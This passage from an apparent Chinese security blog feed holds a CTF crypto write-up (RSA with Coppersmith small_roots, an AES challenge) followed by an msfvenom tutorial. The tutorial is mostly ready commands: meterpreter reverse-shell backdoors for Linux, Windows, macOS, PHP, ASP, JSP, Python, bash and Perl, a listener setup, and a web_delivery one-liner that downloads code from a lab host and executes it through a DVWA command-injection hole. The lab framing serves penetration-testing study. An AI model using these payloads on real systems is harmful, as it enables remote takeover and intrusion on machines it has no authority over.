class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>i<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> roots<span class="token operator">!=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> p4<span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">break</span>q <span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q='</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">p &#x3D; 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711q&#x3D; 9825759610390416003138880321039057063786120681277009947660201742655391150627525256689197020107593156663696181775606008771199371337506657207530847665591719<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>求得了第一个函数的p,q也就是最后的P,Q</p><p>但是发现P,Q都是512位，R是256位可以尝试不用R，直接用P,Q,RSA求flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711</span>q<span class="token operator">=</span> <span class="token number">9825759610390416003138880321039057063786120681277009947660201742655391150627525256689197020107593156663696181775606008771199371337506657207530847665591719</span>c <span class="token operator">=</span>  <span class="token number">10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法二：</p><p>首先利用和方法一一样的方法求出P,Q</p><p>然后利用cooper求出R</p><p>$P \equiv m^p mod n $</p><p>$Q \equiv m^q mod n $</p><p>$R \equiv m^r mod n $</p><p>然后根据费马小定理</p><p>$P \equiv m mod n $</p><p>$Q \equiv m mod n $</p><p>$R \equiv m mod n $</p><p>P&#x3D;kn+m</p><p>Q&#x3D;hn+m</p><p>R&#x3D;bn+m</p><p>$(P-m)<em>(Q-m)</em>(R-m)&#x3D;khbn^3$</p><p>即(P-m)<em>(Q-m)</em>(R-m) &#x3D;0 mod n</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">924936528644761261915490226270682878749572154775391302241867565751616615723850084742168094776229761548826664906020127037598880909798055174894996273670320006942669796769794827782190025101253693980249267932225152093301291975335342891074711919668098647971235568200490825183676601392038486178409517985098598981313504275523679007669267428032655295176395420598988902864122270470643591017567271923728446920345242491655440745259071163984046349191793076143578695363467259</span>P <span class="token operator">=</span> <span class="token number">569152976869063146023072907832518894975041333927991456910198999345700391220835009080679006115013808845384796762879536272124713177039235766835540634080670611913370463720348843789609330086898067623866793724806787825941048552075917807777474750280276411568158631295041513060119750713892787573668959642318994049493233526305607509996778047209856407800405714104373282610244944206314614906974275396096712817649817035559000245832673082730407216670764400076473183825246052</span>Q <span class="token operator">=</span> <span class="token number">600870923560313304359037202752076267074889238956345564584928427345594724253036201151726541881494799597966727749590645445697106549304014936202421316051605075583257261728145977582815350958084624689934980044727977015857381612608005101395808233778123605070134652480191762937123526142746130586645592869974342105683948971928881939489687280641660044194168473162316423173595720804934988042177232172212359550196783303829050288001473419477265817928976860640234279193511499</span>R <span class="token operator">=</span> <span class="token number">502270534450244040624190876542726461324819207575774341876202226485302007962848054723546499916482657212105671666772860609835378197021454344356764800459114299720311023006792483917490176845781998844884874288253284234081278890537021944687301051482181456494678641606747907823086751080399593576505166871905600539035162902145778102290387464751040045505938896117306913887015838631862800918222056118527252590990688099219298296427609455224159445193596547855684004680284030</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>m<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token punctuation">(</span>P<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>Q<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>R<span class="token operator">-</span>m<span class="token punctuation">)</span>f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>m<span class="token operator">=</span>f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment"># m=105960538296223496551922954965164644267919720177702173352061963871195469608683</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后P,Q,R都有了RSA求flag就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711</span>q <span class="token operator">=</span> <span class="token number">9825759610390416003138880321039057063786120681277009947660201742655391150627525256689197020107593156663696181775606008771199371337506657207530847665591719</span>r <span class="token operator">=</span> <span class="token number">105960538296223496551922954965164644267919720177702173352061963871195469608683</span>c <span class="token operator">=</span> <span class="token number">10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949</span>e<span class="token operator">=</span><span class="token number">65537</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># SYC&#123;N0b0dy_Kn0vvs_CryPt0_be7t3r_7haN_Me&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Alexei-needs-help"><a href="#Alexei-needs-help" class="headerlink" title="Alexei needs help"></a>Alexei needs help</h1><p>只需求出ans然后AES解密即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">from</span> binascii <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">2023</span>a <span class="token operator">=</span>  <span class="token number">12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215</span>b <span class="token operator">=</span>  <span class="token number">10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673</span>m <span class="token operator">=</span>  <span class="token number">9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817</span>seq <span class="token operator">=</span>  <span class="token punctuation">[</span><span class="token number">1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064</span><span class="token punctuation">,</span> <span class="token number">12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860</span><span class="token punctuation">,</span> <span class="token number">13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339</span><span class="token punctuation">,</span> <span class="token number">8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005</span><span class="token punctuation">,</span> <span class="token number">5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052</span><span class="token punctuation">,</span> <span class="token number">9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050</span><span class="token punctuation">,</span> <span class="token number">6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410</span><span class="token punctuation">,</span> <span class="token number">3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626</span><span class="token punctuation">,</span> <span class="token number">2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738</span><span class="token punctuation">,</span> <span class="token number">10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967</span><span class="token punctuation">]</span>ct <span class="token operator">=</span> <span class="token number">0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81</span><span class="token keyword">def</span> <span class="token function">seqsum</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>ans <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ans <span class="token operator">+=</span> gp<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token operator">*</span>seq<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token keyword">return</span> ans<span class="token keyword">def</span> <span class="token function">homework</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>p1<span class="token punctuation">,</span>p2<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>p1<span class="token punctuation">,</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token operator">*</span>p1<span class="token operator">+</span>b<span class="token operator">*</span>p2<span class="token operator">+</span>seqsum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>m<span class="token punctuation">,</span>p1<span class="token keyword">return</span> p1ans <span class="token operator">=</span> homework<span class="token punctuation">(</span>n<span class="token punctuation">)</span>k <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>k<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>flag<span class="token operator">=</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b"c7ceedc7197a0d350025fff478f667293ebbaa6b'\x00\x00\x00\x00\x00\x00\x00"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安洵杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom</title>
      <link href="/2023/06/09/msfvenom/"/>
      <url>/2023/06/09/msfvenom/</url>
      
        <content type="html"><![CDATA[<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>msfvenom是msfpayload和msfencode的组合。将这两个攻击集成在一个框架示例中。它是用来生成后门的软件，在目标机器上执行后门，在本地监听上线</p><h2 id="msfvenom基本参数"><a href="#msfvenom基本参数" class="headerlink" title="msfvenom基本参数"></a>msfvenom基本参数</h2><p><img src="/2023/06/09/msfvenom/image-20230531171728448.png" alt="image-20230531171728448"></p><h2 id="msfvenom生成payload"><a href="#msfvenom生成payload" class="headerlink" title="msfvenom生成payload"></a>msfvenom生成payload</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_34839026&#x2F;article&#x2F;details&#x2F;128722499?ops_request_misc&#x3D;&amp;request_id&#x3D;&amp;biz_id&#x3D;102&amp;utm_term&#x3D;msfvenom%E7%94%9F%E6%88%90payload&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-128722499.142^v88^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="可执行程序payload"><a href="#可执行程序payload" class="headerlink" title="可执行程序payload"></a>可执行程序payload</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>port <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-f</span> elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>port <span class="token parameter variable">-f</span> elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>32位</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>port <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;ip LPORT&#x3D;port -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>64位</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>port <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> osx <span class="token parameter variable">-f</span> macho <span class="token operator">></span> shell.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="攻击Windows64位实例"><a href="#攻击Windows64位实例" class="headerlink" title="攻击Windows64位实例"></a>攻击Windows64位实例</h4><p>生成可执行文件木马</p><p><img src="/2023/06/09/msfvenom/image-20230608123941742.png" alt="image-20230608123941742"></p><p>开启监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset lhost ipset lport portrun&#x2F;exploitexploit -j 放在后台运行jobs   查看<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/06/09/msfvenom/image-20230608125721588.png" alt="image-20230608125721588"></p><p>把刚刚生成的木马文件放到靶机里执行</p><p><img src="/2023/06/09/msfvenom/image-20230608130758716.png" alt="image-20230608130758716"></p><p><img src="/2023/06/09/msfvenom/image-20230608130936738.png" alt="image-20230608130936738"></p><p>这样就拿到了meterpreter</p><h3 id="web-payload"><a href="#web-payload" class="headerlink" title="web payload"></a>web payload</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">></span> shell.php<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">></span> shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="war"><a href="#war" class="headerlink" title="war"></a>war</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> war <span class="token operator">></span> shell.wars<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>生成php木马文件</p><p><img src="/2023/06/09/msfvenom/image-20230608132435178.png" alt="image-20230608132435178"></p><p>设置监听</p><p><img src="/2023/06/09/msfvenom/image-20230608132515877.png" alt="image-20230608132515877"></p><p>在靶机里面执行刚刚生成的木马文件</p><p><img src="/2023/06/09/msfvenom/image-20230608132627564.png" alt="image-20230608132627564"></p><p>然后就拿到了meterpreter</p><p><img src="/2023/06/09/msfvenom/image-20230608132825317.png" alt="image-20230608132825317"></p><h3 id="脚本payload"><a href="#脚本payload" class="headerlink" title="脚本payload"></a>脚本payload</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">></span> shell.pymsfvenom <span class="token parameter variable">-a</span> python <span class="token parameter variable">-p</span> python/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="staged-amp-stageless-payload"><a href="#staged-amp-stageless-payload" class="headerlink" title="staged&amp;stageless payload"></a>staged&amp;stageless payload</h3><table><thead><tr><th>payload</th><th>staged</th><th>stsgeless</th></tr></thead><tbody><tr><td>reverse_tcp</td><td>windows&#x2F;meterpreter&#x2F;reverse_tcp</td><td>windows&#x2F;meterpreter_reverse_tcp</td></tr><tr><td>reverse_https</td><td>windows&#x2F;meterpreter&#x2F;reverse_https</td><td>windows&#x2F;meterpreter_reverse_https</td></tr><tr><td>bind_tcp</td><td>windows&#x2F;meterpreter&#x2F;bind_tcp</td><td>windows&#x2F;meterpreter_bind_tcp</td></tr><tr><td>reverse_tcp ipv6</td><td>windows&#x2F;meterpreter&#x2F;reverse_ipv6_tcp</td><td>windows&#x2F;meterpreter_reverse_ipv6_tcp</td></tr></tbody></table><h4 id="stageless"><a href="#stageless" class="headerlink" title="stageless"></a>stageless</h4><p>Stageless meterpreter是一个二进制文件，包含meterpreter的所有必需部分以及所有必需的扩展，全部捆绑在一起，将完整的payload都编译在木马文件中体积较大</p><h4 id="staged"><a href="#staged" class="headerlink" title="staged"></a>staged</h4><p>staged meterpreter负责建立目标用户与攻击者之间的连接，将执行传递到另一个阶段，如reverse_tcp,bind_tcp</p><p>stageless和staged就像web入侵里面提到的大马和小马一样，一个功能齐全，一个只是构造一个连接或命令执行，还需要通过其他的工具进行管理</p><h2 id="攻击Windows实例"><a href="#攻击Windows实例" class="headerlink" title="攻击Windows实例"></a>攻击Windows实例</h2><p>靶机：windows</p><p>攻击机：kali</p><h4 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web_delivery"></a>web_delivery</h4><p>当攻击者用户受害者主机的部分控制权，但还没有拿到一个完整的shell时，web_delivery就派上用场了。</p><p>web_delivery的主要目的是快速和受害者主机建立一条session，当受害者主机存在比如命令注入、远程代码执行等问题时，攻击者可以使用web_delivery生成一条命令进行连接。</p><p>另外web_delivery不会在受害者的主机磁盘上写文件，而是直接将攻击者的服务器上的代码加载到内存执行，有利于绕过检测。</p><p>web_delivery支持php&#x2F;python&#x2F;powershell等多种脚本，使用不同的脚本的payload时需要通过set target 0、1、2来进行设置是什么类型的脚本。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset payload ……set lhostset lportset targets 序号run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="方法一：通过web站点，使用无文件的方式攻击利用"><a href="#方法一：通过web站点，使用无文件的方式攻击利用" class="headerlink" title="方法一：通过web站点，使用无文件的方式攻击利用"></a>方法一：通过web站点，使用无文件的方式攻击利用</h4><p>当我们已经确定了要攻击的靶机，那么下一步就应该去扫描端口，看哪些端口是开放着的</p><pre class="line-numbers language-none"><code class="language-none">namp -sV -T4 靶机IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后根据开放的端口进行攻击</p><p>这里靶机漏洞以dvwa靶场的命令执行为例</p><p>首先利用web_delivery生成木马</p><p><img src="/2023/06/09/msfvenom/image-20230609170441456.png" alt="image-20230609170441456"></p><p>然后把生成的木马放到靶机的漏洞里执行</p><pre class="line-numbers language-none"><code class="language-none">python -c &quot;import sys;import ssl;u&#x3D;__import__(&#39;urllib&#39;+&#123;2:&#39;&#39;,3:&#39;.request&#39;&#125;[sys.version_info[0]],fromlist&#x3D;(&#39;urlopen&#39;,));r&#x3D;u.urlopen(&#39;http:&#x2F;&#x2F;192.168.197.128:8080&#x2F;eWDQyMGivssnLlv&#39;,context&#x3D;ssl._create_unverified_context());exec(r.read());&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="方法二：通过web站点，上传webshell，返回给msf"><a href="#方法二：通过web站点，上传webshell，返回给msf" class="headerlink" title="方法二：通过web站点，上传webshell，返回给msf"></a>方法二：通过web站点，上传webshell，返回给msf</h4>]]></content>
      
      
      <categories>
          
          <category> cs和msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit框架</title>
      <link href="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/"/>
      <url>/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/</url>
      
